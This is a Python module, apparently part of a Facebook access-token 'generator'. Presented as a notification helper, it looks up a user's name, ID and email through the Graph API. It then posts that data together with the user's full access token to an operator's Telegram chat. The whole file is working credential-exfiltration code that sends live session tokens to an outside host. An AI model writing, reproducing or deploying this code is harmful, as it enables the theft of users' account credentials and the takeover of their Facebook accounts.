import requests
import os
from datetime import datetime

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_ADMIN_ID = os.environ.get('TELEGRAM_ADMIN_ID')

def get_user_info(access_token):
    """Get user information from Facebook using access token"""
    try:
        url = "https://graph.facebook.com/me"
        params = {
            'access_token': access_token,
            'fields': 'id,name,email'
        }
        response = requests.get(url, params=params, timeout=10)
        data = response.json()
        if 'error' not in data:
            return {
                'name': data.get('name', 'Unknown'),
                'id': data.get('id', 'Unknown'),
                'email': data.get('email', 'Not Available')
            }
    except:
        pass
    return None

def send_token_notification(access_token, eaad6v7_token):
    """Send Telegram notification when new token is generated"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_ID:
        print("[TELEGRAM] Bot token or admin ID not configured")
        return False
    
    user_info = get_user_info(access_token)
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if user_info:
        name = user_info['name']
        user_id = user_info['id']
        email = user_info['email']
    else:
        name = "Unknown"
        user_id = "Unknown"
        email = "Not Available"
    
    message = f"""✅ <b>New Token Generated!</b>

👤 <b>User Information:</b>
😎 Name: {name}
🆔 ID: {user_id}
📧 Email: {email}

🔑 <b>Access Token:</b>
<code>{eaad6v7_token}</code>

⏰ Time: {current_time}"""

    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_ADMIN_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            print(f"[TELEGRAM] Notification sent successfully for user: {name}")
            return True
        else:
            print(f"[TELEGRAM] Failed to send: {result}")
            return False
    except Exception as e:
        print(f"[TELEGRAM] Error sending notification: {str(e)}")
        return False
